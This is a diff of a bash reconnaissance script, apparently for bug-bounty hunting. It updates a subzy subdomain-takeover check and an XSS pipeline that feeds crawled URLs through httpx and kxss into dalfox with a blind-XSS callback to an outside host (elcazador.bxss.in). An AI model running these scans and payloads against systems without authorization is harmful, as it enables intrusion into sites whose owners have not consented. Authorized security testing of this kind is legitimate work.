@@ -92,7 +92,7 @@ cat /root/Projects/$domain/All_Urls.txt  /root/Projects/$domain/param_urls.txt|e
 
 echo -e "\n Checking for Subdomain Takeover"
 
-subzy --targets /root/Projects/$domain/sorted_subdomain.txt -concurrency 20 --hide_fails | anew /root/Projects/$domain/subdomain_takeover.txt
+subzy r --targets /root/Projects/$domain/sorted_subdomain.txt --concurrency 20 --hide_fails | anew /root/Projects/$domain/subdomain_takeover.txt
 
 
 echo -e "\n Checking for any sensitive keys/information using XKeys"
@@ -111,7 +111,7 @@ cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/s
 
 echo -e "\n Checking for XSS"
 
-cat /root/Projects/$domain/All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in
+cat /root/Projects/$domain/All_Urls.txt |httpx| kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in
 
 echo -e "\n Checking for SQLI"
 
